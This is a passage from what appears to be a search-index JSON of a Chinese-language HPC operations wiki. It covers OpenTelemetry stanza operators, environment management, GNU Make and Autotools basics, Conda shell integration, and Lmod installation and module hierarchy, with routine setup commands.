operator\u3002\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u7b80\u5355\u4ecb\u7ecd\u5982\u4e0b\uff1a</p> <ul> <li>entry \u8868\u793a\u5728\u6d41\u6c34\u7ebf\u4e2d\u79fb\u52a8\u7684\u4e00\u4e2a\u65e5\u5fd7\u3002filed \u6307 entry \u4e2d\u7684\u503c\u3002</li> <li>operator \u521b\u5efa\u3001\u4fee\u6539\u6216\u5220\u9664 entry\u3002\u6709\u56db\u79cd operator\uff1ainput\u3001parser\u3001transform\u3001output\u3002operator \u7ec4\u7ec7\u4e3a operator sequences\u3002</li> <li>Adapter \u5e2e\u52a9 stanza operator \u96c6\u6210\u5230 OTel collector receiver\u3002\u5b83\u8d1f\u8d23 OTel <code>plog.Logs</code> \u548c stanza <code>entry.Entry</code> \u4e4b\u95f4\u7684\u8f6c\u6362\u3002</li> </ul> <p>Example</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6709\u5f88\u591a filed \u7684 entry\uff1a</p> <pre><code>{\n\"body\": {\n    \"message\": \"Something happened.\",\n    \"details\": {\n    \"count\": 100,\n    \"reason\": \"event\"\n    }\n},\n\"timestamp\": \"2020-01-31T00:00:00-00:00\",\n\"severity\": 30,\n\"severity_text\": \"INFO\"\n}\n</code></pre> <p>\u8fd9\u662f\u51e0\u4e2a operator \u7ec4\u6210\u7684 sequence\uff1a</p> <pre><code>operators:\n- type: json_parser\n- type: remove\n  field: attributes.foo\n- type: add\n  key: attributes.bar\n  value: baz\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/","title":"\u8f6f\u4ef6\uff08\u73af\u5883\uff09\u8fd0\u7ef4","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/#\u8f6f\u4ef6\u73af\u5883\u8fd0\u7ef4","title":"\u8f6f\u4ef6\uff08\u73af\u5883\uff09\u8fd0\u7ef4","text":"<p>\u914d\u7f6e\u201c\u73af\u5883\u201d\u901a\u5e38\u6307\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u548c\u5176\u4ed6\u7cfb\u7edf\u53c2\u6570\uff0c\u4ee5\u4fbf\u8f6f\u4ef6\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u80fd\u591f\u6b63\u786e\u5730\u627e\u5230\u6240\u9700\u7684\u4f9d\u8d56\u9879\u548c\u8d44\u6e90\u3002</p> <p>\u73af\u5883\u7ba1\u7406\u7684\u9700\u6c42\u6765\u81ea\u4e8e\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li> <p>\u7f16\u8bd1\u5668\u7684 ABI \u517c\u5bb9\u6027\uff1a\u5b9e\u9645\u9879\u76ee\u4e2d\u5f80\u5f80\u4f1a\u5c1d\u8bd5\u591a\u79cd\u7f16\u8bd1\u5668\u6bd4\u8f83\u6027\u80fd\u3002\u4e0d\u540c\u7f16\u8bd1\u5668\u4ea7\u751f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6 ABI \u4e0d\u4e00\u5b9a\u517c\u5bb9\uff0c\u5e94\u5f53\u4e3a\u4e00\u4e2a\u7f16\u8bd1\u5668\u4ea7\u751f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u94fe\u63a5\u540c\u4e00\u4e2a\u7f16\u8bd1\u5668\u4ea7\u751f\u7684\u5e93\u6587\u4ef6\u3002</p> <p>Libraries built with one compiler need to be linked with applications with the same compiler version.</p> <p>\u94fe\u63a5\u4e0d\u540c\u7f16\u8bd1\u5668\u7684\u5e93\u6587\u4ef6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u751a\u81f3\u662f\u5185\u5b58\u6cc4\u6f0f\u7b49\u4e25\u91cd\u95ee\u9898\u3002</p> </li> <li> <p>\u5207\u6362\u4f9d\u8d56\uff1a\u6211\u4eec\u4e5f\u4f1a\u5c1d\u8bd5\u4e00\u79cd\u4f9d\u8d56\u7684\u4e0d\u540c\u5b9e\u73b0\uff0c\u6bd4\u5982 MPI \u53ef\u4ee5\u91c7\u7528 OpenMPI\u3001MPICH\u3001Intel MPI \u7b49\u4e0d\u540c\u7684\u5b9e\u73b0\u3002\u6240\u9009\u62e9\u7684\u4f9d\u8d56\u5b9e\u73b0\u4e0d\u540c\uff0c\u6784\u5efa\u65f6\u53ef\u80fd\u5c31\u8981\u91c7\u7528\u4e0d\u540c\u9009\u9879\uff0c\u8fd0\u884c\u65f6\u4e5f\u9700\u8981\u914d\u7f6e\u597d\u5bf9\u5e94\u7684\u52a8\u6001\u94fe\u63a5\u3002</p> </li> </ul> <p>\u8981\u5bf9\u81ea\u5df1\u7684\u73af\u5883\u505a\u6539\u52a8\uff0c\u4e00\u822c\u9700\u8981\u624b\u52a8\u4fee\u6539 <code>PATH</code> \u7b49\u73af\u5883\u53d8\u91cf\uff0c\u9000\u51fa\u5e76\u91cd\u65b0\u767b\u5f55 Shell\uff0c\u5341\u5206\u7e41\u7410\u3002\u8fd9\u4e9b\u5de5\u4f5c\u90fd\u53ef\u4ee5\u4ea4\u7ed9 Lmod \u7b49\u73af\u5883\u7ba1\u7406\u5668\u5b8c\u6210\u3002\u6b64\u5916\uff0cSpack \u7b49\u5305\u7ba1\u7406\u5668\u4e5f\u80fd\u591f\u96c6\u6210\u5230 Lmod \u4e2d\uff0c\u63d0\u4f9b\u4e00\u7ad9\u5f0f\u7684\u73af\u5883\u7ba1\u7406\u670d\u52a1\u3002</p> <p>\u6b64\u5916\u6211\u4eec\u8fd8\u4f7f\u7528 Lmod \u548c\u4ee5\u4e0b\u5305\u7ba1\u7406\u5668\uff1a</p> <ul> <li>Spack\uff1a\u7ba1\u7406 HPC \u76f8\u5173\u8f6f\u4ef6\u5305\u548c\u4f9d\u8d56\u3002</li> <li>Conda\uff1a\u7ba1\u7406 Python \u76f8\u5173\u8f6f\u4ef6\u5305\u548c\u4f9d\u8d56\u3002</li> </ul> <p>\u8fd8\u6709\u4e00\u4e9b Vendor Specific \u7684\u73af\u5883\u3001\u9a71\u52a8\u3001\u8f6f\u4ef6\u5305\uff0c\u5747\u653e\u7f6e\u5728 /opt \u4e0b\u3002\u5982\u679c\u8fd9\u4e9b\u4e0d\u80fd\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\uff0c\u53ef\u4ee5\u5728\u5bb6\u76ee\u5f55\u4e0b\u4f7f\u7528 Spack/Conda/\u6e90\u7801\u7f16\u8bd1\u7b49\u65b9\u5f0f\u81ea\u884c\u7ba1\u7406\u73af\u5883\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/","title":"\u7f16\u8bd1/\u6784\u5efa\u7cfb\u7edf","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#\u7f16\u8bd1\u6784\u5efa\u7cfb\u7edf","title":"\u7f16\u8bd1/\u6784\u5efa\u7cfb\u7edf","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#gnu-make","title":"GNU Make","text":"<pre><code>all: hello.exe\n\nhello.exe: hello.o\n    gcc -o hello.exe hello.o\n\nhello.o: hello.c\n    gcc -c hello.c\n\nclean:\n    rm hello.o hello.exe\n</code></pre> <ul> <li>\u4f7f\u7528 Tab \u7f29\u8fdb\u547d\u4ee4\u3002</li> </ul> <p>\u5fc5\u987b\u4f7f\u7528\u5236\u8868\u7b26\u7f29\u8fdb</p> <p>\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u5236\u8868\u7b26\u7f29\u8fdb\uff0c\u4f1a\u5f97\u5230 <code>makefile:4: *** missing separator. Stop</code></p> <p>\u6bcf\u4e2a\u89c4\u5219\u90fd\u6709\u4e09\u4e2a\u90e8\u5206\uff1a\u4e00\u4e2a\u76ee\u6807\u3001\u4e00\u4e2a\u5fc5\u9700\u54c1\u5217\u8868\u548c\u4e00\u4e2a\u547d\u4ee4</p> <pre><code>target: pre-req-1 pre-req-2 ...\n    command\n</code></pre> <ul> <li>\u8fd0\u884c <code>make</code> \u65f6\u9ed8\u8ba4\u542f\u52a8 <code>all</code> \u7684\u751f\u6210\u3002</li> </ul> <p><code>make</code> \u68c0\u67e5\u4e00\u4e2a\u89c4\u5219\u65f6\uff0c\u5148\u67e5\u627e\u5fc5\u987b\u54c1\u5217\u8868\u4e2d\u7684\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u5bfb\u627e\u751f\u6210\u6587\u4ef6\u7684\u89c4\u5219\uff1b\u5982\u679c\u6240\u6709\u6587\u4ef6\u90fd\u6bd4\u76ee\u6807\u65e7\uff0c\u5219\u4e0d\u4f1a\u6267\u884c\u751f\u6210\u547d\u4ee4\uff08\u63d0\u793a <code>Nothing to be done</code>\uff09\u3002</p> <ul> <li> <p>\u6ce8\u91ca\uff1a<code>#</code> \u76f4\u5230\u884c\u5c3e</p> </li> <li> <p>\u89c4\u5219\u8bed\u6cd5\uff1a</p> </li> </ul> <pre><code>target1 [target2 ...]: [pre-req-1 pre-req-2 ...]\n    [command1\n    command2\n    ....]\n</code></pre> <ul> <li>\u4f2a\u76ee\u6807\uff08\u4eba\u5de5\u76ee\u6807\uff09\uff1a\u53ea\u6267\u884c\u547d\u4ee4\uff0c\u4e0d\u751f\u6210\u6587\u4ef6\u3002\u6807\u51c6\u4f2a\u76ee\u6807\u6709\uff1a<code>all</code>\u3001 <code>clean</code>\u3001 <code>install</code>\u3002</li> <li>\u53d8\u91cf\uff1a<code>$</code> \u5f00\u5934\uff0c\u7528\u5706\u62ec\u53f7\u6216\u82b1\u62ec\u53f7\u5305\u88f9\u3002\u5982 <code>$(CC)</code>\u3002</li> <li>\u81ea\u52a8\u53d8\u91cf\uff1a<ul> <li><code>$@</code>\uff1a\u76ee\u6807\u6587\u4ef6\u540d</li> <li><code>$*</code>\uff1a\u76ee\u6807\u6587\u4ef6\u540d\uff08\u4e0d\u5e26\u6269\u5c55\u540d\uff09</li> <li><code>$&lt;</code>\uff1a\u7b2c\u4e00\u4e2a\u5fc5\u9700\u54c1\u7684\u6587\u4ef6\u540d</li> <li><code>$^</code>\uff1a\u6240\u6709\u5fc5\u987b\u54c1\u7684\u6587\u4ef6\u540d\uff08\u7528\u7a7a\u683c\u5206\u9694\uff0c\u53bb\u9664\u91cd\u590d\uff09</li> <li><code>$+</code>\uff1a\u6240\u6709\u5fc5\u987b\u54c1\u7684\u6587\u4ef6\u540d\uff08\u7528\u7a7a\u683c\u5206\u9694\uff0c\u4e0d\u53bb\u9664\u91cd\u590d\uff09</li> <li><code>$?</code>\uff1a\u6240\u6709\u6bd4\u76ee\u6807\u65b0\u7684\u5fc5\u987b\u54c1\u7684\u6587\u4ef6\u540d</li> </ul> </li> <li>\u865a\u62df\u8def\u5f84\uff1a<ul> <li><code>VPATH</code>\uff1a\u8bbe\u5b9a\u5bfb\u627e\u4f9d\u8d56\u9879\u548c\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u5982 <code>VPATH = src include</code></li> <li><code>vpath</code>\uff1a\u8bbe\u5b9a\u67d0\u7c7b\u6587\u4ef6\u7684\u5bfb\u627e\u8def\u5f84\uff0c\u5982 <code>vpath %.c src</code></li> </ul> </li> <li> <p>\u6a21\u5f0f\uff1a</p> <pre><code>%.o: %.c\n    $(COMPILE.c) $(OUTPUT_OPTION) $&lt;\n</code></pre> <ul> <li><code>%</code> \u5339\u914d\u6587\u4ef6\u540d</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#gnu-autotools","title":"GNU Autotools","text":"<ul> <li>Tutorial</li> <li>Doc</li> </ul> <p>\u5386\u53f2\u8f83\u4e3a\u60a0\u4e45\u7684\u9879\u76ee\u90fd\u4f1a\u4f7f\u7528 GNU Autotools \u6765\u6784\u5efa\u9879\u76ee\uff0c\u6807\u51c6\u6d41\u7a0b\u4e3a\uff1a</p> <pre><code>./configure &amp;&amp; make &amp;&amp; make install\n</code></pre> <p>\u9700\u8981\u719f\u6089\u7684\u5de5\u5177\u662f Autoconf \u548c <code>autoreconf</code>\uff0c\u5176\u4ed6\u5de5\u5177\u4e00\u822c\u4e0d\u9700\u8981\u76f4\u63a5\u64cd\u4f5c\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#\u6587\u4ef6\u7ed3\u6784","title":"\u6587\u4ef6\u7ed3\u6784","text":"<p>\u5728 <code>./configure</code> \u9636\u6bb5\u53ef\u4ee5\u4f7f\u7528 <code>--prefix=/path/to/dir</code> \u53c2\u6570\u6307\u5b9a\u5b89\u88c5\u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a <code>/usr/local</code>\u3002</p> <p>\u6784\u5efa\u5de5\u5177\u5c06\u5728\u8be5\u76ee\u5f55\u4e0b\u751f\u6210\u6587\u4ef6\uff0c\u6807\u51c6\u67b6\u6784\u5982\u4e0b\uff1a</p> <pre><code>prefix\n\u251c\u2500\u2500 bin\n\u251c\u2500\u2500 include\n\u251c\u2500\u2500 lib\n\u251c\u2500\u2500 share\n\u2502   \u251c\u2500\u2500 man\n\u2502   \u251c\u2500\u2500 info\n\u2502   ...\n...\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#autoconf","title":"Autoconf","text":"<p><code>./configure</code> \u81ea\u52a8\u68c0\u6d4b\u7cfb\u7edf\u4e2d\u7684\u73af\u5883\u53d8\u91cf\u3001\u5e93\u3001\u5934\u6587\u4ef6\u7b49\uff0c\u57fa\u4e8e <code>configure.ac</code> \u7b49\u6587\u4ef6\u751f\u6210 <code>Makefile</code> \u7b49\u6587\u4ef6\u3002</p> <p>\u53ef\u4ee5\u6307\u5b9a\u7684\u53d8\u91cf\uff1a</p> <pre><code>CC\nCFLAGS\nCXX\nCXXFLAGS\nLDFLAGS\nCPPFLAGS (for both C and C++)\n</code></pre> <p>\u4f7f\u7528 <code>./configure --help</code> \u67e5\u770b\u5e2e\u52a9\u3002</p> \u89c9\u5f97\u5728\u547d\u4ee4\u884c\u4e2d\u6307\u5b9a\u53c2\u6570\u4e0d\u65b9\u4fbf\uff1f <p>\u5982\u679c\u89c9\u5f97\u5199\u547d\u4ee4\u884c\u53c2\u6570\u592a\u957f\uff0c\u53ef\u4ee5\u628a\u53d8\u91cf\u6307\u5b9a\u5230 <code>config.site</code> \u6587\u4ef6\u4e2d\uff1a</p> config.site<pre><code>test -z \"$CC\" &amp;&amp; CC=gcc-3\ntest -z \"$CPPFLAGS\" &amp;&amp; CPPFLAGS=-I$HOME/usr/include\ntest -z \"$LDFLAGS\" &amp;&amp; LDFLAGS=-L$HOME/usr/lib\n</code></pre> <p>\u8fd0\u884c <code>./configure</code> \u65f6\u5e94\u5f53\u4f1a\u63d0\u793a\u5982 <code>configure: loading site script /home/adl/usr/share/config.site</code>\u3002</p> \u4e0d\u9700\u8981\u5728\u6e90\u6587\u4ef6\u76ee\u5f55\u4e2d\u6784\u5efa <p><code>./configure</code> \u5728\u54ea\u91cc\u8fd0\u884c\uff0c\u7a0b\u5e8f\u3001\u76ee\u6807\u6587\u4ef6\u548c\u5e93\u6587\u4ef6\u5c31\u5728\u54ea\u91cc\u751f\u6210\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u4efb\u4f55\u4f60\u5e0c\u671b\u7684\u5730\u65b9\u5f00\u59cb\u6784\u5efa\u9879\u76ee\u3002</p> <pre><code>mkdir build &amp;&amp; cd build\n/nfs/src/amhello-1.0/configure\nmake\n</code></pre> <p>\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5730\u4f7f\u7528\u4e00\u4efd\u6e90\u4ee3\u7801\u4e3a\u591a\u4e2a\u5e73\u53f0\u6784\u5efa\u9879\u76ee\u3002</p> \u4ea4\u53c9\u7f16\u8bd1 <p>\u4f7f\u7528 <code>--host</code> \u53c2\u6570\u6307\u5b9a\u76ee\u6807\u4f53\u7cfb\u7ed3\u6784\u3002</p> <pre><code>./configure --host=i586-mingw32msvc\n</code></pre> <p><code>--target</code> \u53c2\u6570\u7528\u4e8e\u6784\u5efa\u7f16\u8bd1\u5de5\u5177\uff0c\u6307\u5b9a\u7f16\u8bd1\u5de5\u5177\u7684\u76ee\u6807\u4f53\u7cfb\u7ed3\u6784\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#automake","title":"Automake","text":"<p><code>automake</code> \u63a5\u53d7 <code>Makefile.am</code> \u6587\u4ef6\uff0c\u751f\u6210 <code>Makefile.in</code> \u6587\u4ef6\u3002</p> <p>\u53ef\u4ee5\u6307\u5b9a\u7684\u53d8\u91cf\uff1a</p> <pre><code>DESTDIR\n</code></pre> <p>\u4e00\u4e9b\u901a\u7528\u7684 target\uff1a</p> <pre><code>all\ninstall\nclean\ndistclean\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#libtool","title":"Libtool","text":"<p><code>libtool</code> \u7528\u4e8e\u5904\u7406\u5e93\u6587\u4ef6\uff0c\u53ef\u4ee5\u751f\u6210 <code>.la</code> \uff08libtool archive\uff09\u6587\u4ef6\u3002\u548c\u5b83\u6709\u5173\u7684\u64cd\u4f5c\u90fd\u4f1a\u88ab\u7ffb\u8bd1\u4e3a\u771f\u5b9e\u7684\u5e93\u6587\u4ef6\u3002</p> <p>\u5e93\u6587\u4ef6\u662f\u53ef\u79fb\u690d\u6027\u7684\u5730\u72f1</p> <p>\u5728\u4e0d\u540c\u5e73\u53f0\u4e0a\uff0c\u5e93\u6587\u4ef6\u7c7b\u578b\u4e0d\u540c\u3001\u7f16\u8bd1\u9009\u9879\u4e0d\u540c\u3002</p> <p>\u5728 Linux \u4e0a\uff0c\u9759\u6001\u5e93\u4e3a <code>.a</code> \u6587\u4ef6\uff0c\u52a8\u6001\u5e93\u4e3a <code>.so</code> \u6587\u4ef6\u3002\u7f16\u8bd1\u9009\u9879 <code>-fPIC</code> \u7528\u4e8e\u751f\u6210\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\uff0c<code>-shared</code> \u7528\u4e8e\u751f\u6210\u52a8\u6001\u5e93\u3002</p> <p>\u5728\u5b89\u88c5\u65f6\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u53c2\u6570\u63a7\u5236\u5e93\u6587\u4ef6\u751f\u6210\uff1a</p> <pre><code>--enable-shared\n--disable-shared\n--enable-static\n--disable-static\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#\u9644\u7f16\u5199\u6a21\u677f\u6587\u4ef6","title":"\u9644\uff1a\u7f16\u5199\u6a21\u677f\u6587\u4ef6","text":"<p>\u4e3a\u4e86\u4f7f\u7528 GNU Autotools \u6784\u5efa\u9879\u76ee\uff0c\u81f3\u5c11\u9700\u8981\u7f16\u5199\u4e0b\u9762\u7684\u6587\u4ef6\uff1a</p> <ul> <li><code>configure.ac</code></li> <li><code>Makefile.am</code></li> <li><code>src/Makefile.am</code></li> </ul> <p><code>autoconf</code> \u4f1a\u6309\u5408\u9002\u7684\u987a\u5e8f\u6267\u884c\u6240\u6709\u81ea\u52a8\u5316\u5de5\u5177\u3002</p> <pre><code>autoreconf --install\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/build/#cmake","title":"CMake","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/conda/","title":"\u5305\u7ba1\u7406\u5668\uff1aConda","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/conda/#\u5305\u7ba1\u7406\u5668conda","title":"\u5305\u7ba1\u7406\u5668\uff1aConda","text":"<p>Quote</p> <p>Administering a multi-user conda installation</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/conda/#\u96c6\u6210\u5230-shell","title":"\u96c6\u6210\u5230 Shell","text":"<pre><code>ln -s /opt/conda/etc/fish/conf.d/conda.fish /etc/fish/conf.d/conda.fish\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/","title":"\u73af\u5883\u7ba1\u7406\uff1aLmod","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u73af\u5883\u7ba1\u7406lmod","title":"\u73af\u5883\u7ba1\u7406\uff1aLmod","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>Quote</p> <ul> <li>Lmod Doc: Installing Lua and Lmod</li> </ul> <p>\u5b98\u65b9\u6587\u6863\u4e2d\u63d0\u4f9b\u4e86\u8be6\u7ec6\u7684\u5b89\u88c5\u914d\u7f6e\uff0c\u6309\u7167\u6587\u6863\u5b8c\u6210\u4ee5\u4e0b\u4efb\u52a1\u5373\u53ef\uff1a</p> <ul> <li>\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u5b89\u88c5 Lua</li> </ul> <pre><code>sudo apt update\nsudo apt -y build-dep lmod\nlua_ver=$(which lua | xargs realpath -e | xargs basename)\nsudo apt -y install lib${lua_ver}-dev tcl-dev\n</code></pre> <ul> <li>\u4e0b\u8f7d Lmod \u6e90\u7801\u5e76\u6784\u5efa\u5b89\u88c5\uff08\u6216\u8005\u76f4\u63a5 clone \u4ed3\u5e93\uff09</li> </ul> <pre><code>git clone https://github.com/TACC/Lmod.git\ncd Lmod\n./configure --prefix=/opt/apps\nmake\nmake install\n</code></pre> <ul> <li>\u94fe\u63a5 Lmod \u4e3a\u5404\u4e2a Shell \u63d0\u4f9b\u7684\u542f\u52a8\u811a\u672c\u5230\u7cfb\u7edf\u8def\u5f84</li> </ul> <pre><code>ln -s /opt/apps/lmod/lmod/init/profile        /etc/profile.d/z00_lmod.sh\nln -s /opt/apps/lmod/lmod/init/cshrc          /etc/profile.d/z00_lmod.csh\nln -s /opt/apps/lmod/lmod/init/profile.fish   /etc/fish/conf.d/z00_lmod.fish\n</code></pre> <ul> <li>\u786e\u8ba4\u5404\u4e2a shell \u4e0b Lmod \u6b63\u786e\u8fd0\u884c</li> </ul> <p>\u8fd9\u91cc\u9700\u8981\u4f5c\u4e00\u4e9b\u8c03\u6574\uff0c<code>/etc/profile.d</code> \u4e0b\u7684\u6587\u4ef6\u53ea\u4f1a\u5728\u7528\u6237\u767b\u5f55\u65f6\u6267\u884c\u4e00\u6b21\uff0c\u800c\u4f7f\u7528 MPI \u7b49\u6267\u884c\u811a\u672c\u65f6\u5f80\u5f80\u662f non-interactive non-login shell\uff0c\u56e0\u6b64\u9700\u8981\u914d\u7f6e\u4f7f\u4efb\u4f55\u60c5\u51b5\u4e0b shell \u90fd\u80fd\u52a0\u8f7d Lmod\u3002</p> /etc/bash.bashrc<pre><code>if [ -d /etc/profile.d ]; then\n  for i in /etc/profile.d/*.sh; do\n    if [ -r $i ]; then\n      . $i\n    fi\n  done\nfi\n</code></pre> /etc/zsh/zshrc<pre><code>if [ -d /etc/profile.d ]; then\n  setopt no_nomatch\n  for i in /etc/profile.d/*.sh; do\n    if [ -r $i ]; then\n      . $i\n    fi\n  done\n  setopt nomatch\nfi\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u7ef4\u62a4","title":"\u7ef4\u62a4","text":"<p>Lmod \u7a33\u5b9a\u7248\u7ea6\u6bcf\u5e74\u66f4\u65b0\u4e00\u6b21\uff0c\u6309\u7167\u5b98\u65b9\u6587\u6863\u7684\u6307\u5f15\uff0c\u53ef\u4ee5\u5728\u65b0\u7248\u672c\u53d1\u5e03\u540e\u8fdb\u884c\u5347\u7ea7\uff1a</p> <ul> <li><code>make pre-install</code>\uff1a\u6784\u5efa\u65b0\u7248\u672c\uff0c\u8fdb\u884c\u6d4b\u8bd5</li> <li><code>make install</code>\uff1a\u6d4b\u8bd5\u901a\u8fc7\u540e\uff0c\u66ff\u6362\u65e7\u7248\u672c\u7684\u94fe\u63a5</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u6982\u5ff5","title":"\u6982\u5ff5","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#one-name-\u89c4\u5219","title":"one name \u89c4\u5219","text":"<ul> <li>\u4e00\u79cd module \u53ef\u4ee5\u6709\u591a\u4e2a\u7248\u672c\uff0c\u4f46\u53ea\u80fd\u6709\u4e00\u4e2a\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001</li> <li>\u6709\u4e00\u4e9b\u5173\u952e\u7ec4\u4ef6\uff0c\u53ea\u80fd\u52a0\u8f7d\u4e00\u79cd\u5b9e\u73b0\uff0c\u6bd4\u5982\u7f16\u8bd1\u5668\u3001MPI<ul> <li>\u5b83\u4eec\u4f1a\u5728 modulefile \u4e2d\u5e26\u4e0a <code>family</code> \u5b57\u6bb5\uff0c\u6bd4\u5982 <code>family(\"compiler\")</code>\u3002</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#module-\u5c42\u6b21\u7ed3\u6784","title":"Module \u5c42\u6b21\u7ed3\u6784","text":"<p>Quote</p> <ul> <li>How to use a Software Module hierarchy - Lmod</li> </ul> <p><code>MODULEPATH</code> \u4e0b\u7684\u6587\u4ef6\u5e94\u5f53\u6309\u7167\u8f6f\u4ef6\u5c42\u6b21\u7ed3\u6784\u7ec4\u7ec7\u3002\u6309\u5b98\u65b9\u6587\u6863\u63cf\u8ff0\uff0c\u5e94\u5206\u4e3a\u4e09\u5c42 <code>/opt/apps/modulefiles/{Core,Compiler,MPI}</code>\uff1a</p> <ul> <li>Core \u76ee\u5f55\u7528\u4e8e\u90a3\u4e9b\u4e0d\u4f9d\u8d56\u4e8e\u7f16\u8bd1\u5668\u6216 MPI \u5b9e\u73b0\u7684\u6a21\u5757\u3002<ul> <li>\u7f16\u8bd1\u5668\u7684\u6a21\u5757\u6587\u4ef6\u88ab\u653e\u7f6e\u5728 Core \u76ee\u5f55\u4e2d\u3002</li> </ul> </li> <li>Compiler \u76ee\u5f55\u7528\u4e8e\u4ec5\u4f9d\u8d56\u4e8e\u7f16\u8bd1\u5668\u7684\u8f6f\u4ef6\u5305\u3002<ul> <li>MPI \u5b9e\u73b0\u7684\u6a21\u5757\u6587\u4ef6\u88ab\u653e\u7f6e\u5728 Compiler \u76ee\u5f55\u4e0b\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ea\u4f9d\u8d56\u4e8e\u7f16\u8bd1\u5668\u3002</li> </ul> </li> <li>MPI \u76ee\u5f55\u7528\u4e8e\u4f9d\u8d56\u4e8e MPI-\u7f16\u8bd1\u5668\u914d\u5bf9\u7684\u8f6f\u4ef6\u5305\u3002</li> </ul> <p>\u4e3e\u4f8b\u5982\u4e0b\uff1a</p> <pre><code>modulefiles\n\u251c\u2500\u2500 Core\n\u2502   \u251c\u2500\u2500 gcc\n\u2502   \u2502   \u251c\u2500\u2500 4.8.5.lua\n\u2502   \u2502   \u251c\u2500\u2500 5.4.0.lua\n\u2502   \u2502   \u2514\u2500\u2500 7.3.0.lua\n\u2502   \u2514\u2500\u2500 oneapi\n\u2502       \u251c\u2500\u2500 2021.1.1.lua\n\u2502       \u2514\u2500\u2500 2021.2.0.lua\n\u251c\u2500\u2500 Compiler\n\u2502   \u2514\u2500\u2500 oneapi\n\u2502       \u251c\u2500\u2500 2021.1.1\n\u2502       \u2502   \u251c\u2500\u2500 openmpi\n\u2502       \u2502   \u2502   \u251c\u2500\u2500 4.0.5.lua\n\u2502       \u2502   \u2502   \u2514\u2500\u2500 4.1.0.lua\n\u2502       \u2502   \u2514\u2500\u2500 mpich\n\u2502       \u2502       \u251c\u2500\u2500 3.3.2.lua\n\u2502       \u2502       \u2514\u2500\u2500 3.4.1.lua\n\u2502       \u2514\u2500\u2500 2021.2.0\n\u2502           \u251c\u2500\u2500 openmpi\n\u2502           \u2502   \u251c\u2500\u2500 4.0.5.lua\n\u2502           \u2502   \u2514\u2500\u2500 4.1.0.lua\n\u2502           \u2514\u2500\u2500 mpich\n\u2502               \u251c\u2500\u2500 3.3.2.lua\n\u2502               \u2514\u2500\u2500 3.4.1.lua\n\u2514\u2500\u2500 MPI\n    \u2514\u2500\u2500 oneapi\n        \u2514\u2500\u2500 2021.1.1\n            \u251c\u2500\u2500 openmpi\n            \u2502   \u251c\u2500\u2500 4.0.5\n            \u2502   \u2502   \u2514\u2500\u2500 hpl\n            \u2502   \u2502       \u251c\u2500\u2500 2.3.lua\n            \u2502   \u2502       \u2514\u2500\u2500 2.4.lua\n            \u2502   \u2514\u2500\u2500 4.1.0\n            \u2502       \u2514\u2500\u2500 hpl\n            \u2502           \u251c\u2500\u2500 2.3.lua\n            \u2502           \u2514\u2500\u2500 2.4.lua\n            \u2514\u2500\u2500 mpich\n                \u251c\u2500\u2500 3.3.2\n                \u2502   \u2514\u2500\u2500 hpl\n                \u2502       \u251c\u2500\u2500 2.3.lua\n                \u2502       \u2514\u2500\u2500 2.4.lua\n                \u2514\u2500\u2500 3.4.1\n                    \u2514\u2500\u2500 hpl\n                        \u251c\u2500\u2500 2.3.lua\n                        \u2514\u2500\u2500 2.4.lua\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u7f16\u5199-module-file","title":"\u7f16\u5199 Module file","text":"<p>An Introduction to Writing Modulefiles</p> <p>Modulefile \u653e\u7f6e\u5728 <code>MODULEPATH</code> \u4e0b\u7684\u5b50\u76ee\u5f55\u4e2d\u3002\u76ee\u5f55\u540d\u5c31\u662f module \u540d\uff0c\u6587\u4ef6\u540d\u662f\u7248\u672c\u540d\u3002\u6bd4\u5982 <code>ddt</code> 